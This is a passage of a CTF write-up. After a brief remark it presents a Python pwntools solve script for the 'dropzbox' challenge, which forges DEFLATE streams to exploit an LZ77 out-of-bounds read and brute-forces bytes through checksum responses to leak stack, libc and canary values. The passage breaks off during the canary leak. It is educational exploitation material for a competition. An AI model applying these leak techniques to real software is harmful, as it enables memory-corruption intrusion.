+<p>Below is my full solve script. As with mixer, this one also proved to be divisive. I heard that others didn't even make use of the LZ77 out of bounds read. You can instead do some whacky stuff with the return size pointer, which somehow leads to leaking.</p>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">zlib</span> <span class="kn">import</span> <span class="n">compress</span><span class="p">,</span> <span class="n">adler32</span>
+
+<span class="n">BINARY</span> <span class="o">=</span> <span class="s2">&quot;./dropzbox_patched&quot;</span>
+<span class="n">HOST</span> <span class="o">=</span> <span class="s2">&quot;dropzbox-vegan.ctf&quot;</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">1337</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">([</span><span class="n">lib</span> <span class="k">for</span> <span class="n">lib</span> <span class="ow">in</span> <span class="n">elf</span><span class="o">.</span><span class="n">libs</span> <span class="k">if</span> <span class="s1">&#39;/libc.&#39;</span> <span class="ow">in</span> <span class="n">lib</span> <span class="ow">or</span> <span class="s1">&#39;/libc-&#39;</span> <span class="ow">in</span> <span class="n">lib</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span> <span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&quot;WARNING&quot;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">,</span> <span class="s1">&#39;-F&#39;</span> <span class="s1">&#39;#</span><span class="si">{pane_pid}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;-P&#39;</span><span class="p">,</span> <span class="s1">&#39;-p&#39;</span><span class="p">,</span> <span class="s1">&#39;80&#39;</span><span class="p">]</span>
+<span class="n">context</span><span class="o">.</span><span class="n">gdbinit</span> <span class="o">=</span> <span class="s2">&quot;~/.gdbinit_splitmind&quot;</span>
+<span class="n">env</span> <span class="o">=</span> <span class="p">{}</span> <span class="c1"># {&quot;LD_LIBRARY_PATH&quot;: &quot;./&quot;, &quot;LD_PRELOAD&quot;: &quot;&quot;}</span>
+<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;</span>
+<span class="s1">set follow-fork-mode child</span>
+<span class="s1">c</span>
+<span class="s1">&#39;&#39;&#39;</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">connect</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">RAW</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>  <span class="c1"># Bypass for weird forking behavior</span>
+        <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
+        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">p</span>
+
+<span class="c1"># Constants for LZ77 encoding</span>
+<span class="n">length_bases</span> <span class="o">=</span> <span class="p">[</span><span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">43</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">67</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">131</span><span class="p">,</span> <span class="mi">163</span><span class="p">,</span> <span class="mi">195</span><span class="p">,</span> <span class="mi">227</span><span class="p">,</span> <span class="mi">258</span><span class="p">]</span>
+<span class="n">length_bit_counts</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span>
+
+<span class="n">distance_bases</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">129</span><span class="p">,</span> <span class="mi">193</span><span class="p">,</span> <span class="mi">257</span><span class="p">,</span> <span class="mi">385</span><span class="p">,</span> <span class="mi">513</span><span class="p">,</span> <span class="mi">769</span><span class="p">,</span> <span class="mi">1025</span><span class="p">,</span> <span class="mi">1537</span><span class="p">,</span> <span class="mi">2049</span><span class="p">,</span> <span class="mi">3073</span><span class="p">,</span> <span class="mi">4097</span><span class="p">,</span> <span class="mi">6145</span><span class="p">,</span> <span class="mi">8193</span><span class="p">,</span> <span class="mi">12289</span><span class="p">,</span> <span class="mi">16385</span><span class="p">,</span> <span class="mi">24577</span><span class="p">]</span>
+<span class="n">distance_bit_counts</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">13</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">huffman_encode</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot; Encodes n using the fixed huffman encoding set &quot;&quot;&quot;</span>
+
+    <span class="k">if</span> <span class="mi">0</span> <span class="o">&lt;=</span> <span class="n">n</span> <span class="o">&lt;=</span> <span class="mi">143</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nb">bin</span><span class="p">(</span><span class="mi">48</span> <span class="o">+</span> <span class="n">n</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;0&quot;</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="mi">144</span> <span class="o">&lt;=</span> <span class="n">n</span> <span class="o">&lt;=</span> <span class="mi">255</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nb">bin</span><span class="p">(</span><span class="mi">400</span> <span class="o">+</span> <span class="n">n</span> <span class="o">-</span> <span class="mi">144</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="s2">&quot;0&quot;</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="mi">256</span> <span class="o">&lt;=</span> <span class="n">n</span> <span class="o">&lt;=</span> <span class="mi">279</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nb">bin</span><span class="p">(</span><span class="n">n</span> <span class="o">-</span> <span class="mi">256</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s2">&quot;0&quot;</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="mi">280</span> <span class="o">&lt;=</span> <span class="n">n</span> <span class="o">&lt;=</span> <span class="mi">287</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nb">bin</span><span class="p">(</span><span class="mi">192</span> <span class="o">+</span> <span class="n">n</span> <span class="o">-</span> <span class="mi">280</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;0&quot;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Invalid character for encoding: </span><span class="si">{</span><span class="n">n</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">forge_lz77</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">distance</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot; Generate an LZ77 escape sequence with a given length and distace &quot;&quot;&quot;</span>
+
+    <span class="n">i</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">length_bases</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
+
+    <span class="c1"># Find base for length</span>
+    <span class="k">while</span> <span class="n">length_bases</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">length</span><span class="p">:</span>
+        <span class="n">i</span> <span class="o">-=</span> <span class="mi">1</span>
+
+    <span class="c1"># Encode length code</span>
+    <span class="n">length_escape</span> <span class="o">=</span> <span class="n">huffman_encode</span><span class="p">(</span><span class="mi">257</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
+
+    <span class="c1"># Get the corresponding bit length</span>
+    <span class="n">length_bit_count</span> <span class="o">=</span> <span class="n">length_bit_counts</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+    <span class="n">length_bits</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+
+    <span class="c1"># If not 0, calculate length bits</span>
+    <span class="k">if</span> <span class="n">length_bit_count</span><span class="p">:</span>
+        <span class="n">length_diff</span> <span class="o">=</span> <span class="n">length</span> <span class="o">-</span> <span class="n">length_bases</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+        <span class="n">length_bits</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="n">length_diff</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="n">length_bit_count</span><span class="p">,</span> <span class="s2">&quot;0&quot;</span><span class="p">)</span>
+
+    <span class="n">i</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">distance_bases</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
+
+    <span class="c1"># Find base for distance</span>
+    <span class="k">while</span> <span class="n">distance_bases</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">distance</span><span class="p">:</span>
+        <span class="n">i</span> <span class="o">-=</span> <span class="mi">1</span>
+
+    <span class="c1"># Get distance code</span>
+    <span class="n">distance_code</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="n">i</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="s2">&quot;0&quot;</span><span class="p">)</span>
+
+    <span class="c1"># Get the corresponding bit length</span>
+    <span class="n">distance_bit_count</span> <span class="o">=</span> <span class="n">distance_bit_counts</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+    <span class="n">distance_bits</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+
+    <span class="c1"># If not 0, calculate distance bits</span>
+    <span class="k">if</span> <span class="n">distance_bit_count</span><span class="p">:</span>
+        <span class="n">distance_diff</span> <span class="o">=</span> <span class="n">distance</span> <span class="o">-</span> <span class="n">distance_bases</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+        <span class="n">distance_bits</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="n">distance_diff</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="n">distance_bit_count</span><span class="p">,</span> <span class="s2">&quot;0&quot;</span><span class="p">)</span>
+
+    <span class="c1"># A bit confusing, since bits are actually little endian, in contrast to the codes</span>
+    <span class="k">return</span> <span class="n">length_escape</span> <span class="o">+</span> <span class="n">reverse_string</span><span class="p">(</span><span class="n">length_bits</span><span class="p">)</span> <span class="o">+</span> <span class="n">distance_code</span> <span class="o">+</span> <span class="n">reverse_string</span><span class="p">(</span><span class="n">distance_bits</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">zero</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot; Returns a bytearray containing n null bytes &quot;&quot;&quot;</span>
+
+    <span class="k">return</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">reverse_endianess</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot; Reverses the endianness of a 8 bit aligned bit string &quot;&quot;&quot;</span>
+
+    <span class="k">return</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">reversed</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">:</span> <span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">]))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="mi">8</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">reverse_string</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot; Reverse a string &quot;&quot;&quot;</span>
+
+    <span class="k">return</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">reversed</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">bits_to_bytes</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot; Converts an 8 bit aligned bit string to bytearray &quot;&quot;&quot;</span>
+
+    <span class="k">return</span> <span class="nb">bytearray</span><span class="p">((</span><span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">:</span> <span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="n">base</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="mi">8</span><span class="p">)))</span>
+
+<span class="k">def</span> <span class="nf">long_to_bytes</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot; Converts a number n to a big endian bytearray &quot;&quot;&quot;</span>
+
+    <span class="k">return</span> <span class="nb">bytearray</span><span class="p">(((</span><span class="n">n</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="n">i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xff</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">((</span><span class="n">n</span><span class="o">.</span><span class="n">bit_length</span><span class="p">()</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="mi">8</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)))</span>
+
+<span class="k">def</span> <span class="nf">get_checksum</span><span class="p">(</span><span class="n">plt</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot; Returns 4 byte padded checksum for the given plaintext &quot;&quot;&quot;</span>
+
+    <span class="k">return</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">adler32</span><span class="p">(</span><span class="n">plt</span><span class="p">))</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">gen_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot; Generates a payload triggering the overflow in while loading uncompressed blocks &quot;&quot;&quot;</span>
+
+    <span class="c1"># Generate random data for block 1 and 2</span>
+    <span class="n">plain1</span> <span class="o">=</span> <span class="n">zero</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
+    <span class="n">plain2</span> <span class="o">=</span> <span class="n">zero</span><span class="p">(</span><span class="mi">104</span><span class="p">)</span> <span class="o">+</span> <span class="n">payload</span>
+    <span class="n">plain</span> <span class="o">=</span> <span class="n">plain1</span> <span class="o">+</span> <span class="n">plain2</span>
+
+    <span class="c1"># Individually compress blocks and extract header bytes</span>
+    <span class="n">header</span> <span class="o">=</span> <span class="n">compress</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;test&quot;</span><span class="p">)[:</span><span class="mi">2</span><span class="p">]</span>
+    <span class="n">data1</span> <span class="o">=</span> <span class="n">compress</span><span class="p">(</span><span class="n">plain1</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="mi">0</span><span class="p">)[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>  <span class="c1"># level=0 is uncompressed</span>
+    <span class="n">data2</span> <span class="o">=</span> <span class="n">compress</span><span class="p">(</span><span class="n">plain2</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="mi">0</span><span class="p">)[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>
+
+    <span class="c1"># Combine data and clear &quot;last block&quot; bit in first block</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">data1</span> <span class="o">+</span> <span class="n">data2</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
+
+    <span class="c1"># Calculate combined checksum and return complete data</span>
+    <span class="n">checksum</span> <span class="o">=</span> <span class="n">get_checksum</span><span class="p">(</span><span class="n">plain</span><span class="p">)</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">header</span> <span class="o">+</span> <span class="n">data</span> <span class="o">+</span> <span class="n">checksum</span>
+    <span class="k">return</span> <span class="n">data</span>
+
+<span class="k">def</span> <span class="nf">send_file</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot; Helper function to send a file to the server &quot;&quot;&quot;</span>
+
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Quit</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;filename&quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;test&quot;</span><span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;plox&quot;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">try_byte</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot; Try byte for checksum messages &quot;&quot;&quot;</span>
+
+    <span class="n">send_file</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mf">0.1</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">res</span> <span class="ow">and</span> <span class="sa">b</span><span class="s2">&quot;checksum&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span>
+
+<span class="k">def</span> <span class="nf">brute_byte</span><span class="p">(</span><span class="n">known_plain</span><span class="p">,</span> <span class="n">raw_payload</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot; Brute force a single byte with checksum &quot;&quot;&quot;</span>
+
+    <span class="n">header</span> <span class="o">=</span> <span class="n">compress</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;test&quot;</span><span class="p">)[:</span><span class="mi">2</span><span class="p">]</span>
+
+    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">256</span><span class="p">):</span>
+        <span class="n">full_plaintext</span> <span class="o">=</span> <span class="n">known_plain</span> <span class="o">+</span> <span class="nb">bytearray</span><span class="p">((</span><span class="n">char</span><span class="p">,</span> <span class="p">))</span>
+        <span class="n">check</span> <span class="o">=</span> <span class="n">get_checksum</span><span class="p">(</span><span class="n">full_plaintext</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">header</span> <span class="o">+</span> <span class="n">raw_payload</span> <span class="o">+</span> <span class="n">check</span> 
+
+        <span class="k">if</span> <span class="n">try_byte</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+            <span class="k">return</span> <span class="n">char</span>
+
+<span class="k">def</span> <span class="nf">brute_qword</span><span class="p">(</span><span class="n">start_offset</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot; Brute force a qword given an offset &quot;&quot;&quot;</span>
+
+    <span class="n">leak</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">((</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+        <span class="n">bits</span> <span class="o">=</span> <span class="s2">&quot;110&quot;</span> <span class="o">+</span> <span class="n">forge_lz77</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">start_offset</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">-</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;0&quot;</span> <span class="o">*</span> <span class="mi">8</span>
+        <span class="n">bits</span> <span class="o">+=</span> <span class="s2">&quot;0&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">bits</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span><span class="p">))</span>
+        <span class="n">bits</span> <span class="o">=</span> <span class="n">reverse_endianess</span><span class="p">(</span><span class="n">bits</span><span class="p">)</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">bits_to_bytes</span><span class="p">(</span><span class="n">bits</span><span class="p">)</span>
+
+        <span class="n">val</span> <span class="o">=</span> <span class="n">brute_byte</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">:],</span> <span class="n">data</span><span class="p">)</span>
+        <span class="n">leak</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">val</span> <span class="k">if</span> <span class="n">val</span> <span class="k">else</span> <span class="mi">0</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">leak</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span>
+
+<span class="c1"># --------------------------------- LZ77 out of bounds ---------------------------------</span>
+
+<span class="n">conn</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+
+<span class="c1"># Select namespace</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;pwn&quot;</span><span class="p">)</span>
+
+<span class="c1"># Brute force a stack address with out of bounds LZ77 and checksum</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">brute_qword</span><span class="p">(</span><span class="mi">320</span><span class="p">)</span>  <span class="c1"># Leak value at offset 322</span>
+<span class="n">stack</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x228</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;stack @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="c1"># Brute force a libc address with out of bounds LZ77 and checksum</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">brute_qword</span><span class="p">(</span><span class="mi">208</span><span class="p">)</span>  <span class="c1"># Leak value at offset 208</span>
+<span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x1ce9e0</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;libc @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="c1"># ----------------------------------- Leaking canary -----------------------------------</span>
+
+<span class="n">known</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
+
+<span class="c1"># Brute force the canary with checksum</span>
